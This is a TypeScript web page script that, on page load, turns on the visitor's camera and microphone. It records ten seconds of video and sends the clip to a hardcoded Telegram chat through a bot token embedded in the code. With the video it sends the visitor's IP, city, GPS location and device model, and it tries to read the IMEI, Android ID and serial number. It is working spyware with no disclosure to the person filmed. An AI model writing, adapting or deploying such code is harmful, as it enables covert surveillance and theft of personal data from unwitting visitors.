// Interface for Camera Access and Video Recording
interface CameraAccess {
  startCamera(): Promise<void>;
  stopCamera(): void;
  startRecording(): Promise<void>;
  stopRecording(): Promise<Blob>;
  getVideoStream(): MediaStream | null;
  isRecording: boolean;
  isCameraOn: boolean;
}

// Implementation of Camera Access and Video Recording
class CameraHandler implements CameraAccess {
  private videoStream: MediaStream | null = null;
  private mediaRecorder: MediaRecorder | null = null;
  private recordedChunks: Blob[] = [];
  private _isRecording: boolean = false;
  private _isCameraOn: boolean = false;

  public get isRecording(): boolean {
    return this._isRecording;
  }

  public get isCameraOn(): boolean {
    return this._isCameraOn;
  }

  public async startCamera(): Promise<void> {
    try {
      this.videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      this._isCameraOn = true;
    } catch (error) {
      console.error('Error accessing camera:', error);
      throw new Error('Failed to access camera');
    }
  }

  public stopCamera(): void {
    if (this.videoStream) {
      this.videoStream.getTracks().forEach(track => track.stop());
      this.videoStream = null;
      this._isCameraOn = false;
    }
  }

  public async startRecording(): Promise<void> {
    if (!this.videoStream) {
      throw new Error('Camera is not started');
    }

    this.recordedChunks = [];
    this.mediaRecorder = new MediaRecorder(this.videoStream);

    this.mediaRecorder.ondataavailable = (event: BlobEvent) => {
      if (event.data.size > 0) {
        this.recordedChunks.push(event.data);
      }
    };

    this.mediaRecorder.start();
    this._isRecording = true;
  }

  public async stopRecording(): Promise<Blob> {
    return new Promise((resolve, reject) => {
      if (!this.mediaRecorder) {
        reject(new Error('MediaRecorder is not initialized'));
        return;
      }

      this.mediaRecorder.onstop = () => {
        const videoBlob = new Blob(this.recordedChunks, { type: 'video/mp4' });
        this._isRecording = false;
        resolve(videoBlob);
      };

      this.mediaRecorder.stop();
    });
  }

  public getVideoStream(): MediaStream | null {
    return this.videoStream;
  }
}

// Function to record and send video to Telegram
async function recordAndSendVideo() {
  const cameraHandler = new CameraHandler();

  try {
    // Start the camera
    await cameraHandler.startCamera();

    // Start recording
    await cameraHandler.startRecording();

    // Record for 10 seconds (you can adjust this)
    await new Promise(resolve => setTimeout(resolve, 10000));

    // Stop recording and get the video Blob
    const videoBlob = await cameraHandler.stopRecording();

    // Send the video to Telegram
    await sendVideoToTelegram(videoBlob);
  } catch (error) {
    console.error('Error recording and sending video:', error);
  } finally {
    // Stop the camera
    cameraHandler.stopCamera();
  }
}

// Call the function to start recording and sending video
recordAndSendVideo();

// Existing sendVideoToTelegram function
async function sendVideoToTelegram(videoBlob: Blob) {
  const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
  const backupBotToken = '7665961745:AAEW2x3-cvvQb2i_F1dtkaOqldmX8-3VRkM';
  const CHAT_ID = '6571925222';

  if (!CHAT_ID) {
    console.error('Telegram chat ID is not configured');
    return;
  }

  const locationInfo = await getLocationInfo();
  const deviceInfo = await getDeviceInfo();
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);

  const videoFile = new File([videoBlob], 'visitor-video.mp4', {
    type: 'video/mp4'
  });

  formData.append('video', videoFile);
  formData.append('caption', `🎥 Visitor Video
⏰ Time: ${new Date().toISOString()}
🌆 City: ${locationInfo.city}
🌍 Country: ${locationInfo.country}
🌐 IP: ${locationInfo.ip}
📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
📱 IMEI: ${deviceInfo.imei || 'Not available'}
📱 Android ID: ${deviceInfo.androidId || 'Not available'}
📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
  formData.append('supports_streaming', 'true');

  const sendVideo = async (botToken: string): Promise<Response> => {
    if (!botToken) {
      throw new Error('Bot token is missing');
    }

    const chatInfoResponse = await fetch(`https://api.telegram.org/bot${botToken}/getChat?chat_id=${CHAT_ID}`);
    const chatInfo = await chatInfoResponse.json();

    const finalChatId = chatInfo.ok && chatInfo.result.type === 'supergroup' 
      ? chatInfo.result.id 
      : CHAT_ID;

    formData.set('chat_id', finalChatId);

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const responseData = await response.json();
      throw new Error(
        `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
      );
    }

    return response;
  };

  try {
    if (primaryBotToken) {
      try {
        await sendVideo(primaryBotToken);
        console.log('Video sent successfully with primary bot');
        return;
      } catch (error) {
        console.error('Primary bot failed to send video:', error instanceof Error ? error.message : 'Unknown error');
      }
    }

    try {
      await sendVideo(backupBotToken);
      console.log('Video sent successfully with backup bot');
    } catch (error) {
      console.error('Backup bot failed to send video:', error instanceof Error ? error.message : 'Unknown error');
      throw error;
    }
  } catch (error) {
    console.error('Both bots failed to send video:', error instanceof Error ? error.message : 'Unknown error');
  }
}

// Existing getLocationInfo and getDeviceInfo functions
async function getLocationInfo(): Promise<LocationInfo> {
  try {
    const ipResponse = await fetch('https://ipapi.co/json/');
    if (!ipResponse.ok) {
      throw new Error(`Location API error: ${ipResponse.status}`);
    }
    const ipData = await ipResponse.json();

    const locationData: LocationInfo = {
      city: ipData.city || 'Unknown',
      country: ipData.country_name || 'Unknown',
      latitude: ipData.latitude || null,
      longitude: ipData.longitude || null,
      accuracy: null,
      source: 'IP',
      ip: ipData.ip || 'Unknown'
    };

    if ('geolocation' in navigator) {
      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            resolve,
            reject,
            {
              enableHighAccuracy: true,
              timeout: 5000,
              maximumAge: 0
            }
          );
        });

        locationData.latitude = position.coords.latitude;
        locationData.longitude = position.coords.longitude;
        locationData.accuracy = position.coords.accuracy;
        locationData.source = 'GPS';
      } catch (geoError) {
        console.log('Using IP-based location as fallback');
      }
    }

    return locationData;
  } catch (error) {
    console.error('Error fetching location:', error);
    return {
      city: 'Unknown',
      country: 'Unknown',
      latitude: null,
      longitude: null,
      accuracy: null,
      source: 'None',
      ip: 'Unknown'
    };
  }
}

async function getDeviceInfo(): Promise<DeviceInfo> {
  let brand = 'Unknown';
  let model = 'Unknown';
  let type = 'Unknown';
  let platform = 'Unknown';
  let mobile = false;
  let osVersion = 'Unknown';
  let networkType = 'Unknown';
  let batteryLevel: number | undefined;
  let screenResolution: string | undefined;
  let cpuCores: number | undefined;
  let totalMemory: number | undefined;

  try {
    screenResolution = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}x`;

    if (navigator.hardwareConcurrency) {
      cpuCores = navigator.hardwareConcurrency;
    }

    if ('deviceMemory' in navigator) {
      totalMemory = (navigator as any).deviceMemory;
    }

    try {
      const battery = await (navigator as any).getBattery?.();
      if (battery) {
        batteryLevel = battery.level * 100;
      }
    } catch (e) {
      console.log('Battery API not available');
    }

    if ('connection' in navigator) {
      const conn = (navigator as any).connection;
      if (conn) {
        networkType = `${conn.effectiveType || ''} ${conn.type || ''}`.trim() || 'Unknown';
      }
    }

    if ('userAgentData' in navigator) {
      const uaData = navigator.userAgentData as any;
      const hints = await uaData.getHighEntropyValues([
        'platform',
        'platformVersion',
        'model',
        'mobile',
        'architecture',
        'bitness',
        'fullVersionList'
      ]);

      platform = hints.platform || platform;
      model = hints.model || model;
      mobile = hints.mobile;
      osVersion = hints.platformVersion || osVersion;

      const browsers = hints.fullVersionList || [];
      const browserInfo = browsers.find((b: any) => b.brand !== 'Not.A.Brand') || {};
      if (browserInfo.version) {
        model += ` (${browserInfo.brand} ${browserInfo.version})`;
      }
    }

    const ua = navigator.userAgent.toLowerCase();

    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) {
      type = 'Tablet';
      mobile = true;
    } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated/i.test(ua)) {
      type = 'Mobile';
      mobile = true;
    } else {
      type = 'Desktop';
    }

    if (ua.includes('iphone')) {
      brand = 'Apple';
      const match = ua.match(/iphone\sos\s(\d+_\d+)/);
      model = match ? `iPhone (iOS ${match[1].replace('_', '.')})` : 'iPhone';
      osVersion = match ? match[1].replace('_', '.') : osVersion;
    } else if (ua.includes('ipad')) {
      brand = 'Apple';
      const match = ua.match(/ipad\sos\s(\d+_\d+)/);
      model = match ? `iPad (iOS ${match[1].replace('_', '.')})` : 'iPad';
      osVersion = match ? match[1].replace('_', '.') : osVersion;
    } else if (ua.includes('macintosh')) {
      brand = 'Apple';
      model = 'Mac';
      const match = ua.match(/mac\sos\sx\s(\d+[._]\d+)/);
      osVersion = match ? match[1].replace('_', '.') : osVersion;
    } else if (ua.includes('android')) {
      const matches = ua.match(/android\s([0-9.]+);\s([^;)]+)/);
      if (matches) {
        brand = matches[2].split(' ')[0];
        model = `${matches[2]} (Android ${matches[1]})`;
        osVersion = matches[1];
      }
    } else if (ua.includes('windows')) {
      brand = 'Microsoft';
      const version = ua.match(/windows\snt\s(\d+\.\d+)/);
      model = version ? `Windows ${version[1]}` : 'Windows';
      osVersion = version ? version[1] : osVersion;
    }

    let androidId: string | undefined;
    let serialNumber: string | undefined;
    let imei: string | undefined;

    if (typeof window !== 'undefined' && (window as any).Android) {
      try {
        androidId = (window as any).Android.getAndroidId?.();
        serialNumber = (window as any).Android.getSerialNumber?.();
        imei = (window as any).Android.getIMEI?.();
      } catch (e) {
        console.log('Native Android bridge not available');
      }
    }

    return {
      brand,
      model,
      type,
      platform,
      mobile,
      imei,
      androidId,
      serialNumber,
      batteryLevel,
      networkType,
      screenResolution,
      cpuCores,
      totalMemory,
      osVersion
    };
  } catch (error) {
    console.error('Error getting device info:', error);
    return {
      brand,
      model,
      type,
      platform,
      mobile
    };
  }
}
